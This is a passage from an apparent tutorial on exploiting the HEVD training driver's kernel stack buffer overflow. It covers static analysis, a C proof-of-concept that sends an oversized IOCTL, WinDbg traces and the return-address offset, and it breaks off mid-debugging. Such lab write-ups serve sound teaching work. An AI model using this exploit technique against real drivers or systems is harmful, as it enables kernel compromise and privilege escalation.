+<p>We can see that our stack allocated buffer <code>Dst</code> is being used as the destination, the source is <code>Address</code> which is our user-mode buffer and the length of bytes to copy is specified by <code>a2</code>, however, at no point is there a check on whether the contents of <code>Address</code> fits inside <code>Dst</code> and thus if we can make our user-mode buffer greater than 2048 bytes we will have a classic stack buffer overflow. We can confirm the same story in the assembly view.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="mo">00000001400</span><span class="mi">86673</span><span class="w"> </span><span class="n">mov</span><span class="w">     </span><span class="n">r8</span><span class="p">,</span><span class="w"> </span><span class="n">rsi</span><span class="w">             </span><span class="p">;</span><span class="w"> </span><span class="n">Length</span><span class="w"></span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="mo">00000001400</span><span class="mi">86676</span><span class="w"> </span><span class="n">mov</span><span class="w">     </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">rdi</span><span class="w">            </span><span class="p">;</span><span class="w"> </span><span class="n">Source</span><span class="w"></span>
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="mo">00000001400</span><span class="mi">86679</span><span class="w"> </span><span class="n">lea</span><span class="w">     </span><span class="n">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">838</span><span class="n">h</span><span class="o">+</span><span class="n">Dst</span><span class="p">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="w"></span>
+<a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="mo">00000001400</span><span class="mi">8667</span><span class="n">E</span><span class="w"> </span><span class="n">call</span><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="w">       </span><span class="p">;</span><span class="w"> </span><span class="n">Call</span><span class="w"> </span><span class="n">Procedure</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<p>To summarise the vulnerability is a classic stack buffer overflow due to a lack of size check on a copy from user-mode to a kernel-mode buffer. The vulnerable function has a stack allocated buffer of 2048 bytes - as long as we can provide a buffer greater than 2048 bytes then we will be able to overflow the buffer and gain stack control.</p>
+<hr>
+
+<h1 id="dynamic-analysis">Dynamic Analysis<a class="headerlink" href="#dynamic-analysis" title="Permanent link">&para;</a></h1>
+<p>Now that we've found the vulnerability statically its time to try and prove that it is exploitable - to do that we're going to use WinDbg to step through the vulnerable function and verify that we can send a buffer greater than 2048 bytes and get stack control as a result.</p>
+<h2 id="interacting-with-the-driver">Interacting with the Driver<a class="headerlink" href="#interacting-with-the-driver" title="Permanent link">&para;</a></h2>
+<p>In order to begin dynamic analysis we'll need to build a way of interacting with the driver and sending it <abbr title="Input Output Control">IOCTLs</abbr>. You can use any language to do this but we're going to use C because:</p>
+<ol>
+<li>It is really nice to use when working with Windows </li>
+<li>Python3 ctypes absolutely sucks for this kind of thing</li>
+<li>Exploit portability</li>
+</ol>
+<p>The below code block is a very simple C program to interact with the driver - if you're unfamilar with the Windows API then the two most important sections of code to be aware of are <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea"><code>CreateFileA</code></a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol"><code>DeviceIoControl</code></a>.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span>
+<span class="normal"><a href="#__codelineno-2-19">19</a></span>
+<span class="normal"><a href="#__codelineno-2-20">20</a></span>
+<span class="normal"><a href="#__codelineno-2-21">21</a></span>
+<span class="normal"><a href="#__codelineno-2-22">22</a></span>
+<span class="normal"><a href="#__codelineno-2-23">23</a></span>
+<span class="normal"><a href="#__codelineno-2-24">24</a></span>
+<span class="normal"><a href="#__codelineno-2-25">25</a></span>
+<span class="normal"><a href="#__codelineno-2-26">26</a></span>
+<span class="normal"><a href="#__codelineno-2-27">27</a></span>
+<span class="normal"><a href="#__codelineno-2-28">28</a></span>
+<span class="normal"><a href="#__codelineno-2-29">29</a></span>
+<span class="normal"><a href="#__codelineno-2-30">30</a></span>
+<span class="normal"><a href="#__codelineno-2-31">31</a></span>
+<span class="normal"><a href="#__codelineno-2-32">32</a></span>
+<span class="normal"><a href="#__codelineno-2-33">33</a></span>
+<span class="normal"><a href="#__codelineno-2-34">34</a></span>
+<span class="normal"><a href="#__codelineno-2-35">35</a></span>
+<span class="normal"><a href="#__codelineno-2-36">36</a></span>
+<span class="normal"><a href="#__codelineno-2-37">37</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a>
+<a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">()</span><span class="w"></span>
+<a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">OldProtect</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="w">    </span><span class="kt">char</span><span class="w">   </span><span class="n">buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
+<a id="__codelineno-2-11" name="__codelineno-2-11"></a>
+<a id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Preparing exploit buffer!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="w">    </span><span class="cm">/* Fill exploit buffer with As. */</span><span class="w"></span>
+<a id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-2-15" name="__codelineno-2-15"></a>
+<a id="__codelineno-2-16" name="__codelineno-2-16"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DRIVER</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-17" name="__codelineno-2-17"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span>
+<a id="__codelineno-2-19" name="__codelineno-2-19"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-2-20" name="__codelineno-2-20"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Could not open HEVD handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-21" name="__codelineno-2-21"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-2-22" name="__codelineno-2-22"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-2-23" name="__codelineno-2-23"></a>
+<a id="__codelineno-2-24" name="__codelineno-2-24"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="mh">0x222003</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
+<a id="__codelineno-2-25" name="__codelineno-2-25"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-2-26" name="__codelineno-2-26"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-27" name="__codelineno-2-27"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-2-28" name="__codelineno-2-28"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-2-29" name="__codelineno-2-29"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-2-30" name="__codelineno-2-30"></a>
+<a id="__codelineno-2-31" name="__codelineno-2-31"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
+<a id="__codelineno-2-32" name="__codelineno-2-32"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-2-33" name="__codelineno-2-33"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: Stack Buffer Overflow!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-34" name="__codelineno-2-34"></a><span class="w">    </span><span class="n">exploit</span><span class="p">();</span><span class="w"></span>
+<a id="__codelineno-2-35" name="__codelineno-2-35"></a>
+<a id="__codelineno-2-36" name="__codelineno-2-36"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-2-37" name="__codelineno-2-37"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<p>For the purposes of debugging and explaining I imported the <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> symbol file into WinDbg so that we can workaround ASLR.</p>
+<details class="tip" open="open">
+<summary>Tip</summary>
+<p>If you're following along I'd recommend that you do as above and import the <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> symbol file into WinDbg.</p>
+</details>
+<h2 id="verifying-input-and-size">Verifying Input and Size<a class="headerlink" href="#verifying-input-and-size" title="Permanent link">&para;</a></h2>
+<p>Remember in order to cause a buffer overflow we need to overflow the stack allocated buffer of 2048 bytes, to do this we need to confirm that we can give a size of more than this. If you recall the function <code>TriggerBufferOverflowStack</code> takes two arguments, a user-mode address where our buffer is stored and a size argument. If we set a breakpoint on <code>BufferOverflowStackIoctlHandler</code> we can step through to the call to the vulnerable function and check our given arguments validity.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span>
+<span class="normal"><a href="#__codelineno-3-18">18</a></span>
+<span class="normal"><a href="#__codelineno-3-19">19</a></span>
+<span class="normal"><a href="#__codelineno-3-20">20</a></span>
+<span class="normal"><a href="#__codelineno-3-21">21</a></span>
+<span class="normal"><a href="#__codelineno-3-22">22</a></span>
+<span class="normal"><a href="#__codelineno-3-23">23</a></span>
+<span class="normal"><a href="#__codelineno-3-24">24</a></span>
+<span class="normal"><a href="#__codelineno-3-25">25</a></span>
+<span class="normal"><a href="#__codelineno-3-26">26</a></span>
+<span class="normal"><a href="#__codelineno-3-27">27</a></span>
+<span class="normal"><a href="#__codelineno-3-28">28</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">bp</span><span class="w"> </span><span class="n">HEVD</span><span class="o">!</span><span class="n">BufferOverflowStackIoctlHandler</span><span class="w"></span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">g</span><span class="w"></span>
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">hit</span><span class="w"></span>
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">BufferOverflowStackIoctlHandler</span><span class="o">:</span><span class="w"></span>
+<a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="n">fffff808</span><span class="err">`</span><span class="n">c1c16594</span><span class="w"> </span><span class="mi">4883</span><span class="n">ec28</span><span class="w">        </span><span class="n">sub</span><span class="w">     </span><span class="n">rsp</span><span class="p">,</span><span class="mi">28</span><span class="n">h</span><span class="w"></span>
+<a id="__codelineno-3-7" name="__codelineno-3-7"></a>
+<a id="__codelineno-3-8" name="__codelineno-3-8"></a><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">p</span><span class="w"></span>
+<a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">BufferOverflowStackIoctlHandler</span><span class="o">+</span><span class="mh">0x4</span><span class="o">:</span><span class="w"></span>
+<a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="n">fffff808</span><span class="err">`</span><span class="n">c1c16598</span><span class="w"> </span><span class="mi">488</span><span class="n">b4a20</span><span class="w">        </span><span class="n">mov</span><span class="w">     </span><span class="n">rcx</span><span class="p">,</span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span><span class="w"></span>
+<a id="__codelineno-3-11" name="__codelineno-3-11"></a>
+<a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">p</span><span class="w"></span>
+<a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">BufferOverflowStackIoctlHandler</span><span class="o">+</span><span class="mh">0xd</span><span class="o">:</span><span class="w"></span>
+<a id="__codelineno-3-14" name="__codelineno-3-14"></a><span class="n">fffff808</span><span class="err">`</span><span class="n">c1c165a1</span><span class="w"> </span><span class="mi">8</span><span class="n">b5210</span><span class="w">          </span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">rdx</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span><span class="w"></span>
+<a id="__codelineno-3-15" name="__codelineno-3-15"></a>
+<a id="__codelineno-3-16" name="__codelineno-3-16"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dq</span><span class="w"> </span><span class="n">rcx</span><span class="w"></span>
+<a id="__codelineno-3-17" name="__codelineno-3-17"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f6e8</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-18" name="__codelineno-3-18"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f6f</span><span class="mi">8</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-19" name="__codelineno-3-19"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f</span><span class="mi">708</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-20" name="__codelineno-3-20"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f</span><span class="mi">718</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-21" name="__codelineno-3-21"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f</span><span class="mi">728</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-22" name="__codelineno-3-22"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f</span><span class="mi">738</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-23" name="__codelineno-3-23"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f</span><span class="mi">748</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-24" name="__codelineno-3-24"></a><span class="mo">00000000</span><span class="err">`</span><span class="mf">0061f</span><span class="mi">758</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
+<a id="__codelineno-3-25" name="__codelineno-3-25"></a>
+<a id="__codelineno-3-26" name="__codelineno-3-26"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dq</span><span class="w"> </span><span class="n">rdx</span><span class="o">+</span><span class="mi">10</span><span class="w"></span>
+<a id="__codelineno-3-27" name="__codelineno-3-27"></a><span class="n">ffffc58f</span><span class="err">`</span><span class="mf">40f</span><span class="mi">84</span><span class="n">dc0</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000</span><span class="mi">800</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00222003</span><span class="w"></span>
+<a id="__codelineno-3-28" name="__codelineno-3-28"></a><span class="p">[...]</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<p>The above figure shows clearly that we do have complete control of these arguments. The first instruction of interest is <code>HEVD!BufferOverflowStackIoctlHandler+0x4</code> where our user-mode address is moved from <code>rdx+20</code> into <code>rcx</code>. The next instruction of interest is immediately after at <code>HEVD!BufferOverflowStackIoctlHandler+0xd</code> where the size of our user-mode buffer is moved from <code>rdx+10</code> to <code>edx</code>. We then dump those arguments to verify.</p>
+<hr>
+
+<h1 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h1>
+<p>Now that we've verified we control both arguments to the vulnerable function unconditionally we can move forward with gaining control of the return address.</p>
+<h2 id="gaining-control-of-the-return-address">Gaining Control of the Return Address<a class="headerlink" href="#gaining-control-of-the-return-address" title="Permanent link">&para;</a></h2>
+<p>In order to figure out where we gain control we can use a number of methods such as using a cylic pattern. </p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>┌──(kali㉿kali)-[~/Desktop]
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a>└─$ msf-pattern_create -l 2100
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4"></a>┌──(kali㉿kali)-[~/Desktop]
+<a id="__codelineno-4-5" name="__codelineno-4-5"></a>└─$ msf-pattern_offset -l 2100 -q 4332724331724330 
+<a id="__codelineno-4-6" name="__codelineno-4-6"></a>[*] Exact match at offset 2072
+</code></pre></div></td></tr></table></div>
+<p>Based on the above we see that we gain control of the return address at 2072 bytes. We'll update our code accordingly.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">()</span><span class="w"></span>
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">OldProtect</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="w">    </span><span class="kt">char</span><span class="w">   </span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
+<a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2072</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-5-7" name="__codelineno-5-7"></a>
+<a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Preparing exploit buffer!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="w">    </span><span class="cm">/* Fill exploit buffer with As. */</span><span class="w"></span>
+<a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-5-11" name="__codelineno-5-11"></a>
+<a id="__codelineno-5-12" name="__codelineno-5-12"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;BBBBBBBB&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<p>We can run our POC again and verify that we gain control of the return address as shown in the below.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-6-10">10</a></span>
+<span class="normal"><a href="#__codelineno-6-11">11</a></span>
+<span class="normal"><a href="#__codelineno-6-12">12</a></span>
+<span class="normal"><a href="#__codelineno-6-13">13</a></span>
+<span class="normal"><a href="#__codelineno-6-14">14</a></span>
+<span class="normal"><a href="#__codelineno-6-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>0: kd&gt; bp HEVD!TriggerBufferOverflowStack+0xca
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a>0: kd&gt; g
+<a id="__codelineno-6-4" name="__codelineno-6-4"></a>Breakpoint 0 hit
